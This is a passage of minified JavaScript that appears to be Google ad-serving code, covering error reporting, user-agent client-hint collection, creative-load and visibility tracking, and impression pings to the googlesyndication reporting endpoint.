      a.removeEventListener && a.removeEventListener(b, c, !1);
    }
    ;
    var ib = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
    function jb(a, b, c, d) {
      for (var e = c.length; 0 <= (b = a.indexOf(c, b)) && b < d;) {
        var f = a.charCodeAt(b - 1);
        if (38 == f || 63 == f) if (f = a.charCodeAt(b + e), !f || 61 == f || 38 == f || 35 == f) return b;
        b += e + 1;
      }
      return -1;
    }
    var kb = /#|$/,
      lb = /[?&]($|#)/;
    function mb(a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            za(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    }
    function nb(a, b) {
      b = void 0 === b ? !1 : b;
      var c = void 0 === c ? x : c;
      for (var d = 0; c && 40 > d++ && (!b && !mb(c) || !a(c));) a: {
        try {
          var e = c.parent;
          if (e && e != c) {
            c = e;
            break a;
          }
        } catch (f) {}
        c = null;
      }
    }
    function ob() {
      if (!globalThis.crypto) return Math.random();
      try {
        var a = new Uint32Array(1);
        globalThis.crypto.getRandomValues(a);
        return a[0] / 65536 / 65536;
      } catch (b) {
        return Math.random();
      }
    }
    function pb(a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    }
    var qb = [];
    function rb() {
      var a = qb;
      qb = [];
      a = ea(a);
      for (var b = a.next(); !b.done; b = a.next()) {
        b = b.value;
        try {
          b();
        } catch (c) {}
      }
    }
    function sb(a, b) {
      "complete" === a.readyState || "interactive" === a.readyState ? (qb.push(b), 1 == qb.length && (window.Promise ? Promise.resolve().then(rb) : window.setImmediate ? setImmediate(rb) : setTimeout(rb, 0))) : a.addEventListener("DOMContentLoaded", b);
    }
    function tb(a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    }
    ;
    function U(a, b, c, d) {
      ub(x, a, void 0 === b ? null : b, !1, void 0 === c ? !1 : c, void 0 === d ? !1 : d);
    }
    function ub(a, b, c, d, e, f) {
      f = void 0 === f ? !1 : f;
      a.google_image_requests || (a.google_image_requests = []);
      var g = tb("IMG", a.document);
      if (c || e) {
        var h = function (k) {
          c && c(k);
          if (e) {
            k = a.google_image_requests;
            var l = xa(k, g);
            0 <= l && Array.prototype.splice.call(k, l, 1);
          }
          hb(g, "load", h);
          hb(g, "error", h);
        };
        gb(g, "load", h);
        gb(g, "error", h);
      }
      d && (g.referrerPolicy = "no-referrer");
      f && (g.attributionSrc = "");
      g.src = b;
      a.google_image_requests.push(g);
    }
    var vb = fb(function () {
      return "referrerPolicy" in tb("IMG");
    });
    function wb() {
      this.g = {};
    }
    function V(a) {
      xb || (xb = new yb());
      var b = xb.g[a.key];
      if ("proto" === a.valueType) {
        try {
          var c = JSON.parse(b);
          if (Array.isArray(c)) return c;
        } catch (d) {}
        return a.defaultValue;
      }
      return typeof b === typeof a.defaultValue ? b : a.defaultValue;
    }
    ;
    function yb() {
      this.g = {};
      var a = document.currentScript;
      a = (a = (a = void 0 === a ? null : a) && "0" === a.getAttribute("data-jc") ? a : document.querySelector('[data-jc="0"]')) && a.getAttribute("data-jc-flags") || "";
      try {
        var b = JSON.parse(a)[0];
        a = "";
        for (var c = 0; c < b.length; c++) a += String.fromCharCode(b.charCodeAt(c) ^ "\u0003\u0007\u0003\u0007\b\u0004\u0004\u0006\u0005\u0003".charCodeAt(c % 10));
        this.g = JSON.parse(a);
      } catch (d) {}
    }
    var xb;
    u(yb, wb);
    function zb(a, b) {
      var c = void 0 === c ? {} : c;
      this.error = a;
      this.context = b.context;
      this.msg = b.message || "";
      this.id = b.id || "jserror";
      this.meta = c;
    }
    ;
    var Bb = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)");
    function Cb(a, b) {
      this.g = a;
      this.h = b;
    }
    function Db(a, b) {
      this.url = a;
      this.R = !!b;
      this.depth = null;
    }
    ;
    var Eb = null;
    function Fb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Date.now();
    }
    function Gb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now ? a.now() : null;
    }
    ;
    function Hb(a, b) {
      var c = Gb() || Fb();
      this.label = a;
      this.type = b;
      this.value = c;
      this.duration = 0;
      this.taskId = this.slotId = void 0;
      this.uniqueId = Math.random();
    }
    ;
    var W = x.performance,
      Ib = !!(W && W.mark && W.measure && W.clearMarks),
      X = fb(function () {
        var a;
        if (a = Ib) {
          var b;
          if (null === Eb) {
            Eb = "";
            try {
              a = "";
              try {
                a = x.top.location.hash;
              } catch (c) {
                a = x.location.hash;
              }
              a && (Eb = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "");
            } catch (c) {}
          }
          b = Eb;
          a = !!b.indexOf && 0 <= b.indexOf("1337");
        }
        return a;
      });
    function Jb() {
      var a = window;
      this.h = [];
      this.i = a || x;
      var b = null;
      a && (a.google_js_reporting_queue = a.google_js_reporting_queue || [], this.h = a.google_js_reporting_queue, b = a.google_measure_js_timing);
      this.g = X() || (null != b ? b : 1 > Math.random());
    }
    function Kb(a) {
      a && W && X() && (W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"));
    }
    Jb.prototype.start = function (a, b) {
      if (!this.g) return null;
      a = new Hb(a, b);
      b = "goog_" + a.label + "_" + a.uniqueId + "_start";
      W && X() && W.mark(b);
      return a;
    };
    Jb.prototype.end = function (a) {
      if (this.g && "number" === typeof a.value) {
        a.duration = (Gb() || Fb()) - a.value;
        var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
        W && X() && W.mark(b);
        !this.g || 2048 < this.h.length || this.h.push(a);
      }
    };
    function Lb() {
      this.i = "&";
      this.h = {};
      this.j = 0;
      this.g = [];
    }
    function Mb(a, b) {
      var c = {};
      c[a] = b;
      return [c];
    }
    function Nb(a, b, c, d, e) {
      var f = [];
      pb(a, function (g, h) {
        (g = Ob(g, b, c, d, e)) && f.push(h + "=" + g);
      });
      return f.join(b);
    }
    function Ob(a, b, c, d, e) {
      if (null == a) return "";
      b = b || "&";
      c = c || ",$";
      "string" == typeof c && (c = c.split(""));
      if (a instanceof Array) {
        if (d = d || 0, d < c.length) {
          for (var f = [], g = 0; g < a.length; g++) f.push(Ob(a[g], b, c, d + 1, e));
          return f.join(c[d]);
        }
      } else if ("object" == typeof a) return e = e || 0, 2 > e ? encodeURIComponent(Nb(a, b, c, d, e + 1)) : "...";
      return encodeURIComponent(String(a));
    }
    function Pb(a, b) {
      var c = "https://pagead2.googlesyndication.com" + b,
        d = Qb(a) - b.length;
      if (0 > d) return "";
      a.g.sort(function (n, p) {
        return n - p;
      });
      b = null;
      for (var e = "", f = 0; f < a.g.length; f++) for (var g = a.g[f], h = a.h[g], k = 0; k < h.length; k++) {
        if (!d) {
          b = null == b ? g : b;
          break;
        }
        var l = Nb(h[k], a.i, ",$");
        if (l) {
          l = e + l;
          if (d >= l.length) {
            d -= l.length;
            c += l;
            e = a.i;
            break;
          }
          b = null == b ? g : b;
        }
      }
      a = "";
      null != b && (a = e + "trn=" + b);
      return c + a;
    }
    function Qb(a) {
      var b = 1,
        c;
      for (c in a.h) b = c.length > b ? c.length : b;
      return 3997 - b - a.i.length - 1;
    }
    ;
    function Rb() {
      var a = Sb;
      this.m = Tb;
      this.g = void 0 === a ? null : a;
      this.h = null;
      this.i = !1;
      this.o = this.j;
    }
    function Ub(a) {
      var b = Vb;
      try {
        if (b.g && b.g.g) {
          var c = b.g.start(903 .toString(), 3);
          var d = a();
          b.g.end(c);
        } else d = a();
      } catch (g) {
        a = !0;
        try {
          Kb(c), a = b.o(903, new zb(g, {
            message: Wb(g)
          }), void 0, void 0);
        } catch (h) {
          b.j(217, h);
        }
        if (a) {
          var e, f;
          null == (e = window.console) || null == (f = e.error) || f.call(e, g);
        } else throw g;
      }
      return d;
    }
    function Xb(a) {
      return function () {
        var b = pa.apply(0, arguments);
        return Ub(function () {
          return a.apply(void 0, b);
        });
      };
    }
    Rb.prototype.j = function (a, b, c, d, e) {
      e = e || "jserror";
      try {
        var f = new Lb();
        f.g.push(1);
        f.h[1] = Mb("context", a);
        b.error && b.meta && b.id || (b = new zb(b, {
          message: Wb(b)
        }));
        if (b.msg) {
          var g = b.msg.substring(0, 512);
          f.g.push(2);
          f.h[2] = Mb("msg", g);
        }
        var h = b.meta || {};
        if (this.h) try {
          this.h(h);
        } catch (ja) {}
        if (d) try {
          d(h);
        } catch (ja) {}
        b = [h];
        f.g.push(3);
        f.h[3] = b;
        d = x;
        b = [];
        g = null;
        do {
          var k = d;
          if (mb(k)) {
            var l = k.location.href;
            g = k.document && k.document.referrer || null;
          } else l = g, g = null;
          b.push(new Db(l || ""));
          try {
            d = k.parent;
          } catch (ja) {
            d = null;
          }
        } while (d && k != d);
        l = 0;
        for (var n = b.length - 1; l <= n; ++l) b[l].depth = n - l;
        k = x;
        if (k.location && k.location.ancestorOrigins && k.location.ancestorOrigins.length == b.length - 1) for (n = 1; n < b.length; ++n) {
          var p = b[n];
          p.url || (p.url = k.location.ancestorOrigins[n - 1] || "", p.R = !0);
        }
        var q = new Db(x.location.href, !1);
        k = null;
        var v = b.length - 1;
        for (p = v; 0 <= p; --p) {
          var t = b[p];
          !k && Bb.test(t.url) && (k = t);
          if (t.url && !t.R) {
            q = t;
            break;
          }
        }
        t = null;
        var y = b.length && b[v].url;
        0 != q.depth && y && (t = b[v]);
        var w = new Cb(q, t);
        if (w.h) {
          var r = w.h.url || "";
          f.g.push(4);
          f.h[4] = Mb("top", r);
        }
        var I = {
          url: w.g.url || ""
        };
        if (w.g.url) {
          var L = w.g.url.match(ib),
            C = L[1],
            D = L[3],
            ka = L[4];
          q = "";
          C && (q += C + ":");
          D && (q += "//", q += D, ka && (q += ":" + ka));
          var Ab = q;
        } else Ab = "";
        I = [I, {
          url: Ab
        }];
        f.g.push(5);
        f.h[5] = I;
        Yb(this.m, e, f, this.i, c);
      } catch (ja) {
        try {
          Yb(this.m, e, {
            context: "ecmserr",
            rctx: a,
            msg: Wb(ja),
            url: w && w.g.url
          }, this.i, c);
        } catch (id) {}
      }
      return !0;
    };
    function Wb(a) {
      var b = a.toString();
      a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
      a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
      if (a.stack) {
        a = a.stack;
        var c = b;
        try {
          -1 == a.indexOf(c) && (a = c + "\n" + a);
          for (var d; a != d;) d = a, a = a.replace(RegExp("((https?:/..*/)[^/:]*:\\d+(?:.|\n)*)\\2"), "$1");
          b = a.replace(RegExp("\n *", "g"), "\n");
        } catch (e) {
          b = c;
        }
      }
      return b;
    }
    ;
    function Zb(a) {
      var b = "J";
      if (a.J && a.hasOwnProperty(b)) return a.J;
      b = new a();
      return a.J = b;
    }
    ;
    function $b() {}
    ;
    function ac() {
      this.g = Math.random();
    }
    function bc() {
      var a = Tb,
        b = window.google_srt;
      0 <= b && 1 >= b && (a.g = b);
    }
    function Yb(a, b, c, d, e) {
      if (((void 0 === d ? 0 : d) ? a.g : Math.random()) < (e || .01)) try {
        if (c instanceof Lb) var f = c;else f = new Lb(), pb(c, function (h, k) {
          var l = f,
            n = l.j++;
          h = Mb(k, h);
          l.g.push(n);
          l.h[n] = h;
        });
        var g = Pb(f, "/pagead/gen_204?id=" + b + "&");
        g && U(g);
      } catch (h) {}
    }
    ;
    var Tb,
      Vb,
      Sb = new Jb();
    function cc() {
      if (!window.google_measure_js_timing) {
        var a = Sb;
        a.g = !1;
        a.h != a.i.google_js_reporting_queue && (X() && ya(a.h, Kb), a.h.length = 0);
      }
    }
    (function (a) {
      Tb = null != a ? a : new ac();
      "number" !== typeof window.google_srt && (window.google_srt = Math.random());
      bc();
      Vb = new Rb();
      Vb.h = function () {};
      Vb.i = !0;
      "complete" == window.document.readyState ? cc() : Sb.g && gb(window, "load", function () {
        cc();
      });
    })();
    var dc = ["FRAME", "IMG", "IFRAME"],
      ec = /^[01](px)?$/;
    function fc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function gc(a, b, c, d, e, f, g) {
      c = void 0 === c ? !0 : c;
      d = void 0 === d ? !1 : d;
      f = void 0 === f ? !1 : f;
      g = void 0 === g ? !1 : g;
      if (a = fc(a)) {
        e || (e = function (C, D, ka) {
          C.addEventListener(D, ka);
        });
        for (var h = !1, k = function (C) {
            h || (h = !0, b(C));
          }, l, n, p = 0; p < dc.length; ++p) if (dc[p] == a.tagName) {
          n = 3;
          l = [a];
          break;
        }
        l || (l = a.querySelectorAll(dc.join(",")), n = 2);
        var q = 0,
          v = 0,
          t = !g,
          y = a = !1;
        p = {};
        for (var w = 0; w < l.length; p = {
          v: p.v
        }, w++) {
          var r = l[w];
          if (!("IMG" == r.tagName && (r.complete && (!r.naturalWidth || !r.naturalHeight) || (void 0 === g ? 0 : g) && r.style && "none" === r.style.display) || ec.test(r.getAttribute("width")) && ec.test(r.getAttribute("height")))) {
            p.v = "IMG" === r.tagName;
            if ("IMG" == r.tagName) var I = r.naturalWidth && r.naturalHeight ? !0 : !1;else try {
              I = "complete" === (r.readyState ? r.readyState : r.contentWindow && r.contentWindow.document && r.contentWindow.document.readyState) ? !0 : !1;
            } catch (C) {
              I = void 0 === d ? !1 : d;
            }
            if (I) a = !0, p.v && (t = !0);else {
              q++;
              var L = function (C) {
                return function (D) {
                  q--;
                  !q && t && k(n);
                  C.v && (D = D && "error" === D.type, v--, D || (t = !0), !v && y && t && k(n));
                };
              }(p);
              e(r, "load", L);
              p.v && (v++, e(r, "error", L));
            }
          }
        }
        0 === v && (t = !0);
        l = null;
        if (0 === q && !a && "complete" === x.document.readyState) n = 5;else if (q || !a) {
          e(x, "load", function () {
            !f || !v && t ? k(4) : y = !0;
          });
          return;
        }
        c && k(n);
      }
    }
    ;
    function hc(a, b, c) {
      if (a) for (var d = 0; null != a && 500 > d && !c(a); ++d) a = b(a);
    }
    function ic(a, b) {
      hc(a, function (c) {
        try {
          return c === c.parent ? null : c.parent;
        } catch (d) {}
        return null;
      }, b);
    }
    function jc(a, b) {
      if ("IFRAME" == a.tagName) b(a);else {
        a = a.querySelectorAll("IFRAME");
        for (var c = 0; c < a.length && !b(a[c]); ++c);
      }
    }
    function kc(a) {
      return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
    }
    function lc(a, b, c) {
      try {
        var d = JSON.parse(c.data);
      } catch (g) {}
      if ("object" === typeof d && d && "creativeLoad" === d.type) {
        var e = kc(a);
        if (c.source && e) {
          var f;
          ic(c.source, function (g) {
            try {
              if (g.parent === e) return f = g, !0;
            } catch (h) {}
          });
          f && jc(a, function (g) {
            if (g.contentWindow === f) return b(d), !0;
          });
        }
      }
    }
    function mc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function nc(a, b) {
      var c = mc(a);
      if (c) if (c.onCreativeLoad) c.onCreativeLoad(b);else {
        var d = b ? [b] : [],
          e = function (f) {
            for (var g = 0; g < d.length; ++g) try {
              d[g](1, f);
            } catch (h) {}
            d = {
              push: function (h) {
                h(1, f);
              }
            };
          };
        c.onCreativeLoad = function (f) {
          d.push(f);
        };
        c.setAttribute("data-creative-load-listener", "");
        c.addEventListener("creativeLoad", function (f) {
          e(f.detail);
        });
        x.addEventListener("message", function (f) {
          lc(c, e, f);
        });
      }
    }
    ;
    function Y(a) {
      var b = this;
      this.h = !1;
      this.g = [];
      a(function (c) {
        oc(b, c);
      });
    }
    function oc(a, b) {
      if (!a.h) if (b instanceof Y) b.then(function (c) {
        oc(a, c);
      });else {
        a.h = !0;
        a.i = b;
        for (b = 0; b < a.g.length; ++b) pc(a, a.g[b]);
        a.g = [];
      }
    }
    function pc(a, b) {
      a.h ? b(a.i) : a.g.push(b);
    }
    Y.prototype.then = function (a) {
      var b = this;
      return new Y(function (c) {
        pc(b, function (d) {
          c(a(d));
        });
      });
    };
    function qc(a) {
      var b = a.length,
        c = 0;
      return new Y(function (d) {
        if (0 == b) d([]);else for (var e = [], f = {
            s: 0
          }; f.s < b; f = {
          s: f.s
        }, ++f.s) a[f.s].then(function (g) {
          return function (h) {
            e[g.s] = h;
            ++c == b && d(e);
          };
        }(f));
      });
    }
    function rc() {
      var a,
        b = new Y(function (c) {
          a = c;
        });
      return new sc(b, a);
    }
    function sc(a, b) {
      this.promise = a;
      this.resolve = b;
    }
    ;
    function tc(a) {
      return a.prerendering ? 3 : {
        visible: 1,
        hidden: 2,
        prerender: 3,
        preview: 4,
        unloaded: 5
      }[a.visibilityState || a.webkitVisibilityState || a.mozVisibilityState || ""] || 0;
    }
    function uc(a) {
      var b;
      a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
      return b;
    }
    ;
    function vc(a, b, c) {
      function d(k) {
        try {
          var l = "object" === typeof k.data ? k.data : JSON.parse(k.data);
          g === l.paw_id && (window.clearTimeout(h), window.removeEventListener("message", d), l.signal ? b(l.signal) : l.error && c(l.error));
        } catch (n) {
          k = {
            msg: "postmessageError",
            err: n instanceof Error ? n.message : "nonError",
            data: null == k.data ? "null" : 500 < k.data.length ? k.data.substring(0, 500) : k.data
          }, Zb($b), l = [], !k.eid && l.length && (k.eid = l.toString()), Yb(Tb, "paw_sigs", k, !0);
        }
      }
      var e = {},
        f = 200;
      e = void 0 === e ? {} : e;
      b = void 0 === b ? function () {} : b;
      c = void 0 === c ? function () {} : c;
      f = void 0 === f ? 200 : f;
      var g = String(Math.floor(2147483647 * ob())),
        h = 0;
      window.addEventListener("message", function (k) {
        Xb(function () {
          d(k);
        })();
      });
      a.postMessage(Object.assign({}, {
        paw_id: g
      }, e));
      h = window.setTimeout(function () {
        window.removeEventListener("message", d);
        c("PAW GMA postmessage timed out.");
      }, f);
    }
    function wc() {
      var a = window,
        b,
        c;
      if (a.gmaSdk || (null == (b = a.webkit) ? 0 : null == (c = b.messageHandlers) ? 0 : c.getGmaViewSignals)) return a;
      try {
        var d = window.parent,
          e,
          f;
        if (d.gmaSdk || (null == (e = d.webkit) ? 0 : null == (f = e.messageHandlers) ? 0 : f.getGmaViewSignals)) return d;
      } catch (g) {}
      return null;
    }
    ;
    function xc(a) {
      this.l = P(a);
    }
    u(xc, R);
    function yc(a) {
      this.l = P(a);
    }
    u(yc, R);
    function zc(a, b) {
      return Q(a, 2, b);
    }
    function Ac(a, b) {
      return Q(a, 3, b);
    }
    function Bc(a, b) {
      return Q(a, 4, b);
    }
    function Cc(a, b) {
      return Q(a, 5, b);
    }
    function Dc(a, b) {
      return Q(a, 9, b);
    }
    function Ec(a, b) {
      var c = b;
      b = a.l;
      var d = M(b);
      if (d & 2) throw Error();
      if (null != c) {
        for (var e = !!c.length, f = 0; f < c.length; f++) {
          var g = c[f];
          e = e && !(J(g.l) & 2);
        }
        g = J(c);
        f = g | 1;
        f = (e ? f | 8 : f & -9) | 4;
        f != g && (Object.isFrozen(c) && (c = Array.prototype.slice.call(c)), K(c, f));
      }
      null == c && (c = void 0);
      Va(b, d, 10, c);
      return a;
    }
    function Fc(a, b) {
      return Ua(a, 11, null == b ? b : Ma(b));
    }
    function Gc(a, b) {
      return Q(a, 1, b);
    }
    function Hc(a, b) {
      return Ua(a, 7, null == b ? b : Ma(b));
    }
    yc.aa = [10, 6];
    var Ic = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
    function Jc(a) {
      var b;
      return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
    }
    function Kc(a) {
      var b, c;
      return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
    }
    function Lc(a) {
      if (!Kc(a)) return null;
      var b = Jc(a);
      if (b.uach_promise) return b.uach_promise;
      a = a.navigator.userAgentData.getHighEntropyValues(Ic).then(function (c) {
        null != b.uach || (b.uach = c);
        return c;
      });
      return b.uach_promise = a;
    }
    function Mc(a) {
      var b;
      return Fc(Ec(Cc(zc(Gc(Bc(Hc(Dc(Ac(new yc(), a.architecture || ""), a.bitness || ""), a.mobile || !1), a.model || ""), a.platform || ""), a.platformVersion || ""), a.uaFullVersion || ""), (null == (b = a.fullVersionList) ? void 0 : b.map(function (c) {
        var d = new xc();
        d = Q(d, 1, c.brand);
        return Q(d, 2, c.version);
      })) || []), a.wow64 || !1);
    }
    function Nc(a) {
      var b, c;
      return null != (c = null == (b = Lc(a)) ? void 0 : b.then(function (d) {
        return Mc(d);
      })) ? c : null;
    }
    ;
    function Oc(a) {
      return ["omid_v1_present", "omid_v1_present_web", "omid_v1_present_app"].some(function (b) {
        try {
          var c = a.frames && !!a.frames[b];
        } catch (d) {
          c = !1;
        }
        return c;
      });
    }
    ;
    function Pc() {
      this.g = x.document;
      this.u = x;
      this.h = null;
      this.i = this.j = "";
      this.m = Qc();
      Rc(this);
    }
    function Rc(a) {
      var b = [],
        c = V(bb) || !!T.aub;
      if (c || T.aunb) {
        var d = Nc(a.u);
        d && (d = d.then(function (p) {
          p = Xa(p);
          for (var q = [], v = 0, t = 0; t < p.length; t++) {
            var y = p.charCodeAt(t);
            255 < y && (q[v++] = y & 255, y >>= 8);
            q[v++] = y;
          }
          p = Ca(q, 3);
          a.j = p;
        }), c && b.push(d));
      }
      if (V(ab) || V(cb)) {
        c = wc();
        var e;
        if (null == c ? 0 : null == (e = c.gmaSdk) ? 0 : e.getViewSignals) (e = c.gmaSdk.getViewSignals()) && !V(cb) && (a.i = "&ms=" + e);else {
          var f, g;
          if (null == c ? 0 : null == (f = c.webkit) ? 0 : null == (g = f.messageHandlers) ? 0 : g.getGmaViewSignals) {
            var h, k;
            vc(null == c ? void 0 : null == (h = c.webkit) ? void 0 : null == (k = h.messageHandlers) ? void 0 : k.getGmaViewSignals, function (p) {
              V(cb) || (a.i = "&" + p);
            }, function () {});
          }
        }
      }
      T.umi && (e = new Y(function (p) {
        a.h = p;
      }), b.push(e));
      if (T.ebrpfa || V($a)) {
        var l = rc();
        b.push(l.promise);
        sb(a.g, function () {
          gc(a.g.body, l.resolve);
        });
      }
      3 == tc(a.g) && 3 == tc(a.g) && b.push(Sc(a));
      if (T.opxdv && a.m) {
        var n = rc();
        b.push(n.promise);
        e = x.omrhp;
        "function" === typeof e ? e(n.resolve) : (e = x.document.querySelector("script[data-jc='86']")) && e.addEventListener("load", function () {
          x.omrhp(n.resolve);
        });
      }
      a.o = qc(b);
    }
    function Tc(a) {
      var b = a.search(kb);
      var c = jb(a, 0, "ase", b);
      if (0 > c) b = null;else {
        var d = a.indexOf("&", c);
        if (0 > d || d > b) d = b;
        b = decodeURIComponent(a.slice(c + 4, -1 !== d ? d : 0).replace(/\+/g, " "));
      }
      if (b === 2 .toString()) {
        var e = x.document;
        e = void 0 === e ? document : e;
        var f;
        e = null != (f = e.featurePolicy) && f.allowedFeatures().includes("attribution-reporting") ? 6 : 5;
        f = a.search(kb);
        b = 0;
        for (d = []; 0 <= (c = jb(a, b, "nis", f));) d.push(a.substring(b, c)), b = Math.min(a.indexOf("&", c) + 1 || f, f);
        d.push(a.slice(b));
        d.join("").replace(lb, "$1");
        null != e && encodeURIComponent(String(e));
        e = !1;
        f = !0;
        e = void 0 === e ? !1 : e;
        f = void 0 === f ? !1 : f;
        x.fetch ? (e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        }, f && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        }), x.fetch(a, e)) : U(a, void 0, e, f);
      } else if (T.atsb) {
        e = void 0 === e ? !1 : e;
        if (f = x.navigator) f = x.navigator.userAgent, f = /Chrome/.test(f) && !/Edge/.test(f) ? !0 : !1;
        f && x.navigator.sendBeacon ? x.navigator.sendBeacon(a) : U(a, void 0, e);
      } else U(a);
    }
    function Qc() {
      var a = S(x).omid3p,
        b = !!a && "function" === typeof a.registerSessionObserver && "function" === typeof a.addEventListener;
      b || nb(function (c) {
        Oc(c) && (b = !0);
        return b;
      }, !0);
      return b;
    }
    function Sc(a) {
      return new Y(function (b) {
        var c = uc(a.g);
        if (c) {
          var d = function () {
            3 != tc(a.g) && (hb(a.g, c, d), b());
          };
          gb(a.g, c, d);
        }
      });
    }
    ;
    function Z() {
      return new Date().getTime();
    }
    function Uc() {
      try {
        var a = void 0 === a ? document : a;
        var b;
        return !(null == (b = a.featurePolicy) || !b.features().includes("attribution-reporting"));
      } catch (c) {
        return !1;
      }
    }
    function Vc(a) {
      var b = a.querySelector('a img[alt="Advertisement"]');
      return b && /^img_anch_/.test(b.parentElement.id) ? b : a;
    }
    function Wc(a, b) {
      this.I = a;
      this.u = this.i = this.g = !1;
      this.O = 1;
      this.m = T.eavp ? 1 : 0;
      this.h = T.ebrp ? 1 : 0;
      this.W = !!T.opxb;
      this.D = this.A = null;
      this.H = rc();
      this.N = Z();
      this.M = null;
      this.T = .001 > Math.random();
      this.P = T.eeid || "";
      this.C = this.o = null;
      this.U = (Math.random() + "").slice(-5);
      this.j = !1;
      this.B = null;
      this.K = 0;
      this.F = this.G = null;
      this.V = !!T.fld;
      this.S = T.adsg || "";
      this.Y = !!T.uffp;
      this.X = !!T.espa;
      if (a = !!T.aifbl) {
        var c, d;
        a = -1 != (null == (c = x.navigator) ? void 0 : null == (d = c.userAgent) ? void 0 : d.indexOf("Firefox"));
      }
      this.L = a;
      Xc(this, b);
    }
    var Yc;
    function Zc(a, b) {
      b && 0 !== a.h && (a.C = Z() - a.N, a.L && (b = Vc(b)), $c(a, b).then(function (c) {
        c && (a.A = c);
        a.u = !0;
        ad(a);
      }));
    }
    function bd() {
      try {
        nb(function (a) {
          a = a.document;
          if (db.length && a.head) for (var b = ea(db), c = b.next(); !c.done; c = b.next()) if ((c = c.value) && a.head) {
            var d = tb("META");
            a.head.appendChild(d);
            d.httpEquiv = "origin-trial";
            d.content = c;
          }
          return !1;
        }, !1);
      } catch (a) {}
    }
    function Xc(a, b) {
      Zc(a, b);
      bd();
      0 !== a.h || 0 !== a.m ? cd(a) ? dd(a).then(function () {
        ed(a);
      }) : ed(a) : a.B = 1;
      Zb(Pc).o.then(function () {
        a.g = !0;
        ad(a);
      });
      fd(a);
      ad(a);
    }
    function $c(a, b) {
      return new Y(function (c) {
        function d(e, f) {
          a.D = e;
          c(f);
        }
        nc(b, d);
        gc(b, d, !0, !1, void 0, !0, a.L);
      });
    }
    function cd(a) {
      a.j = Qc();
      a.B = a.j ? 4 : 1;
      return a.j;
    }
    function dd(a) {
      return new Y(function (b) {
        function c(e) {
          a.B = 3;
          e && (a.G = e.src, a.F = e.sdk);
          b();
        }
        var d = x.omrhp;
        "function" === typeof d ? d(c) : (d = x.document.querySelector("script[data-jc='86']")) && d.addEventListener("load", function () {
          x.omrhp(c);
        });
      });
    }
    function ed(a) {
      a.i = !0;
      ad(a);
    }
    function ad(a) {
      if (a.g) {
        var b = null,
          c = 0;
        2 !== a.O ? b = 0 : 1 === a.m && a.g && a.i ? b = 12 : 1 === a.h && a.g && a.i && a.u && (b = 11);
        if (null != b) a: {
          if (0 === b ? 1 === a.h && a.g && a.i && a.u ? c = 2 : 1 === a.m && a.g && a.i && (c = 1) : 12 === b && 1 === a.h && a.g && a.i && a.u && (c = 2), a.W && (a.T && "" !== a.I && a.j && (a.o || 0 !== b || gd(a, !0), 12 !== b && 1 !== c && 2 !== c || gd(a, !1)), 0 === b && 0 === c)) break a;
          var d = Z(),
            e = hd(a, b, c, d);
          0 === b && (a.O = 2, a.M = d);
          if (12 === b || c) a.m = 2;
          if (11 === b || 2 === c) a.h = 2;
          if (a.V) {
            e = new Ya();
            Q(e, 1, a.S);
            e = Xa(e);
            if (0 === b) {
              d = S(x);
              var f;
              null == d || null == (f = d.fence) || f.reportEvent({
                eventType: "impression",
                eventData: e,
                destination: ["buyer"]
              });
              var g;
              null == d || null == (g = d.fence) || g.reportEvent({
                eventType: "impression",
                destination: ["component-seller"]
              });
            }
            if (11 === b || 2 === c) {
              var h, k;
              null == (h = S(x)) || null == (k = h.fence) || k.reportEvent({
                eventType: "b2rimpression",
                eventData: e,
                destination: ["buyer"]
              });
            }
          } else e && (((f = a.X && Uc()) || a.Y) && x.fetch ? (g = {
            method: "GET",
            keepalive: !0
          }, f ? "setAttributionReporting" in XMLHttpRequest.prototype ? g.attributionReporting = {
            eventSourceEligible: !0,
            triggerEligible: !1
          } : g.headers = {
            "Attribution-Reporting-Eligible": "event-source"
          } : g.mode = "no-cors", x.fetch(eb(e, "&ftch=1"), g)) : Tc(e));
          0 === b && a.H.resolve();
        }
      }
    }
    function gd(a, b) {
      var c = null;
      b ? a.o = Z() : c = a.o ? Z() - a.o : "?";
      a = "https://pagead2.googlesyndication.com/pagead/gen_204?id=opxhb&evt=" + (b ? "d" : "o") + ("&eid=" + encodeURIComponent(a.P)) + (null == c ? "" : "&ttp=" + c);
      Tc(a);
    }
    function hd(a, b, c, d) {
      if ("" === a.I) return null;
      var e = {
        omid: a.j ? 1 : 0,
        rm: a.B,
        ctpt: d - a.N
      };
      0 !== b && (e.vt = b, e.dtpt = d - (a.M || 0));
      0 !== c && (e.cbvp = c);
      a.D && (e.dett = a.D);
      a.A && (e.beid = a.A.eventId, e.vend = a.A.vendor);
